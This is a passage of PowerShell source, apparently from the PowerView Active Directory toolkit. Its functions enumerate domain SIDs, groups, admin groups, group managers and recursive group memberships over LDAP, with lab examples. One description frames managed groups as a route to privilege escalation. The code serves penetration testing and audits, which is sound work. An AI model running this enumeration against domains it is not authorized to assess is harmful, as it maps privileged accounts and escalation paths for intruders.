                    if ($Subnet.properties -and ($Subnet.properties.siteobject -like "*$SiteName*")) {
                        $Subnet
                    }
                    elseif ($Subnet.siteobject -like "*$SiteName*") {
                        $Subnet
                    }
                }
                else {
                    $Subnet
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainSubnet] Error disposing of the Results object: $_"
                }
            }
            $SubnetSearcher.dispose()
        }
    }
}

function Get-DomainSID {
<#
.SYNOPSIS

Returns the SID for the current domain or the specified domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer  

.DESCRIPTION

Returns the SID for the current domain or the specified domain by executing
Get-DomainComputer with the -LDAPFilter set to (userAccountControl:1.2.840.113556.1.4.803:=8192)
to search for domain controllers through LDAP. The SID of the returned domain controller
is then extracted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainSID

.EXAMPLE

Get-DomainSID -Domain testlab.local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainSID -Credential $Cred

.OUTPUTS

String

A string representing the specified domain SID.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $SearcherArguments = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

    $DCSID = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid

    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[Get-DomainSID] Error extracting domain SID for '$Domain'"
    }
}

function Get-DomainGroup {
<#
.SYNOPSIS

Return all groups or specific group objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainObject, Convert-ADName, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all group objects for
the current domain are returned. To return the groups a specific user/group is
a part of, use -MemberIdentity X to execute token groups enumeration.

.PARAMETER Identity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to query for. Wildcards accepted.

.PARAMETER MemberIdentity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the user/group member to query for group membership.

.PARAMETER AdminCount

Switch. Return users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER GroupScope

Specifies the scope (DomainLocal, Global, or Universal) of the group(s) to search for.
Also accepts NotDomainLocal, NotGloba, and NotUniversal as negations.

.PARAMETER GroupProperty

Specifies a specific property to search for when performing the group search.
Possible values are Security, Distribution, CreatedBySystem, and NotCreatedBySystem.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainGroup | select samaccountname

samaccountname
--------------
WinRMRemoteWMIUsers__
Administrators
Users
Guests
Print Operators
Backup Operators
...

.EXAMPLE

Get-DomainGroup *admin* | select distinguishedname

distinguishedname
-----------------
CN=Administrators,CN=Builtin,DC=testlab,DC=local
CN=Hyper-V Administrators,CN=Builtin,DC=testlab,DC=local
CN=Schema Admins,CN=Users,DC=testlab,DC=local
CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
CN=Domain Admins,CN=Users,DC=testlab,DC=local
CN=DnsAdmins,CN=Users,DC=testlab,DC=local
CN=Server Admins,CN=Users,DC=testlab,DC=local
CN=Desktop Admins,CN=Users,DC=testlab,DC=local

.EXAMPLE

Get-DomainGroup -Properties samaccountname -Identity 'S-1-5-21-890171859-3433809279-3366196753-1117' | fl

samaccountname
--------------
Server Admins

.EXAMPLE

'CN=Desktop Admins,CN=Users,DC=testlab,DC=local' | Get-DomainGroup -Server primary.testlab.local -Verbose
VERBOSE: Get-DomainSearcher search string: LDAP://DC=testlab,DC=local
VERBOSE: Get-DomainGroup filter string: (&(objectCategory=group)(|(distinguishedname=CN=DesktopAdmins,CN=Users,DC=testlab,DC=local)))

usncreated            : 13245
grouptype             : -2147483646
samaccounttype        : 268435456
samaccountname        : Desktop Admins
whenchanged           : 8/10/2016 12:30:30 AM
objectsid             : S-1-5-21-890171859-3433809279-3366196753-1118
objectclass           : {top, group}
cn                    : Desktop Admins
usnchanged            : 13255
dscorepropagationdata : 1/1/1601 12:00:00 AM
name                  : Desktop Admins
distinguishedname     : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
member                : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
whencreated           : 8/10/2016 12:29:43 AM
instancetype          : 4
objectguid            : f37903ed-b333-49f4-abaa-46c65e9cca71
objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=testlab,DC=local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGroup -Credential $Cred

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

'DEV\Domain Admins' | Get-DomainGroup -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainGroup] Extracted domain 'dev.testlab.local' from 'DEV\Domain Admins'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainGroup] filter string: (&(objectCategory=group)(|(samAccountName=Domain Admins)))

distinguishedname
-----------------
CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local

.OUTPUTS

PowerView.Group

Custom PSObject with translated group property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $MemberIdentity,

        [Switch]
        $AdminCount,

        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $GroupScope,

        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $GroupProperty,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GroupSearcher) {
            if ($PSBoundParameters['MemberIdentity']) {

                if ($SearcherArguments['Properties']) {
                    $OldProperties = $SearcherArguments['Properties']
                }

                $SearcherArguments['Identity'] = $MemberIdentity
                $SearcherArguments['Raw'] = $True

                Get-DomainObject @SearcherArguments | ForEach-Object {
                    # convert the user/group to a directory entry
                    $ObjectDirectoryEntry = $_.GetDirectoryEntry()

                    # cause the cache to calculate the token groups for the user/group
                    $ObjectDirectoryEntry.RefreshCache('tokenGroups')

                    $ObjectDirectoryEntry.TokenGroups | ForEach-Object {
                        # convert the token group sid
                        $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value

                        # ignore the built in groups
                        if ($GroupSid -notmatch '^S-1-5-32-.*') {
                            $SearcherArguments['Identity'] = $GroupSid
                            $SearcherArguments['Raw'] = $False
                            if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
                            $Group = Get-DomainObject @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match '^S-1-') {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match '^CN=') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning "[Get-DomainGroup] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments['Domain'] = $GroupDomain
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[Get-DomainGroup] Searching for adminCount=1'
                    $Filter += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $GroupScopeValue = $PSBoundParameters['GroupScope']
                    $Filter = Switch ($GroupScopeValue) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group scope '$GroupScopeValue'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $GroupPropertyValue = $PSBoundParameters['GroupProperty']
                    $Filter = Switch ($GroupPropertyValue) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group property '$GroupPropertyValue'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGroup] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroup] filter string: $($GroupSearcher.filter)"

                if ($PSBoundParameters['FindOne']) { $Results = $GroupSearcher.FindOne() }
                else { $Results = $GroupSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        # return raw result objects
                        $Group = $_
                    }
                    else {
                        $Group = Convert-LDAPProperty -Properties $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGroup] Error disposing of the Results object"
                    }
                }
                $GroupSearcher.dispose()
            }
        }
    }
}

function Get-DomainManagedSecurityGroup {
<#
.SYNOPSIS

Returns all security groups in the current (or target) domain that have a manager set.

Author: Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject, Get-DomainGroup, Get-DomainObjectAcl  

.DESCRIPTION

Authority to manipulate the group membership of AD security groups and distribution groups
can be delegated to non-administrators by setting the 'managedBy' attribute. This is typically
used to delegate management authority to distribution groups, but Windows supports security groups
being managed in the same way.

This function searches for AD groups which have a group manager set, and determines whether that
user can manipulate group membership. This could be a useful method of horizontal privilege
escalation, especially if the manager can manipulate the membership of a privileged group.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainManagedSecurityGroup | Export-PowerViewCSV -NoTypeInformation group-managers.csv

Store a list of all security groups with managers in group-managers.csv

.OUTPUTS

PowerView.ManagedSecurityGroup

A custom PSObject describing the managed security group.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $SearcherArguments['Domain'] = $Domain
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = $Env:USERDNSDOMAIN
        }

        # go through the list of security groups on the domain and identify those who have a manager
        Get-DomainGroup @SearcherArguments | ForEach-Object {
            $SearcherArguments['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $SearcherArguments['Identity'] = $_.managedBy
            $Null = $SearcherArguments.Remove('LDAPFilter')

            # $SearcherArguments
            # retrieve the object that the managedBy DN refers to
            $GroupManager = Get-DomainObject @SearcherArguments
            # Write-Host "GroupManager: $GroupManager"
            $ManagedGroup = New-Object PSObject
            $ManagedGroup | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $ManagedGroup | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $ManagedGroup | Add-Member Noteproperty 'ManagerName' $GroupManager.samaccountname
            $ManagedGroup | Add-Member Noteproperty 'ManagerDistinguishedName' $GroupManager.distinguishedName

            # determine whether the manager is a user or a group
            if ($GroupManager.samaccounttype -eq 0x10000000) {
                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($GroupManager.samaccounttype -eq 0x30000000) {
                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'User'
            }

            $ACLArguments = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }

            # # TODO: correct!
            # # find the ACLs that relate to the ability to write to the group
            # $xacl = Get-DomainObjectAcl @ACLArguments -Verbose
            # # $ACLArguments
            # # double-check that the manager
            # if ($xacl.ObjectType -eq 'bf9679c0-0de6-11d0-a285-00aa003049e2' -and $xacl.AceType -eq 'AccessAllowed' -and ($xacl.ObjectSid -eq $GroupManager.objectsid)) {
            #     $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' $True
            # }
            # else {
            #     $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' $False
            # }

            $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'

            $ManagedGroup.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $ManagedGroup
        }
    }
}

function Get-DomainGroupMember {
<#
.SYNOPSIS

Return the members of a specific domain group.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainGroup, Get-DomainGroupMember, Convert-ADName, Get-DomainObject, ConvertFrom-SID  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for the specified
group matching the criteria. Each result is then rebound and the full user
or group object is returned.

.PARAMETER Identity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to query for. Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Recurse

Switch. If the group member is a group, recursively try to query its members as well.

.PARAMETER RecurseUsingMatchingRule

Switch. Use LDAP_MATCHING_RULE_IN_CHAIN in the LDAP search query to recurse.
Much faster than manual recursion, but doesn't reveal cross-domain groups,
and only returns user accounts (no nested group objects themselves).

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGroupMember "Desktop Admins"

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : Testing Group
MemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

'Desktop Admins' | Get-DomainGroupMember -Recurse

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : Testing Group
MemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129

GroupDomain             : testlab.local
GroupName               : Testing Group
GroupDistinguishedName  : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : harmj0y
MemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

Get-DomainGroupMember -Domain testlab.local -Identity 'Desktop Admins' -RecurseUingMatchingRule

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : harmj0y
MemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

Get-DomainGroup *admin* -Properties samaccountname | Get-DomainGroupMember

.EXAMPLE

'CN=Enterprise Admins,CN=Users,DC=testlab,DC=local', 'Domain Admins' | Get-DomainGroupMember

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGroupMember -Credential $Cred -Identity 'Domain Admins'

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

'dev\domain admins' | Get-DomainGroupMember -Verbose
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainGroupMember] Extracted domain 'dev.testlab.local' from 'dev\domain admins'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainGroupMember] Get-DomainGroupMember filter string: (&(objectCategory=group)(|(samAccountName=domain admins)))
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=user1,CN=Users,DC=dev,DC=testlab,DC=local)))

GroupDomain             : dev.testlab.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
MemberDomain            : dev.testlab.local
MemberName              : user1
MemberDistinguishedName : CN=user1,CN=Users,DC=dev,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-339048670-1233568108-4141518690-201108

VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local)))
GroupDomain             : dev.testlab.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
MemberDomain            : dev.testlab.local
MemberName              : Administrator
MemberDistinguishedName : CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local
MemberObjectClass       : user
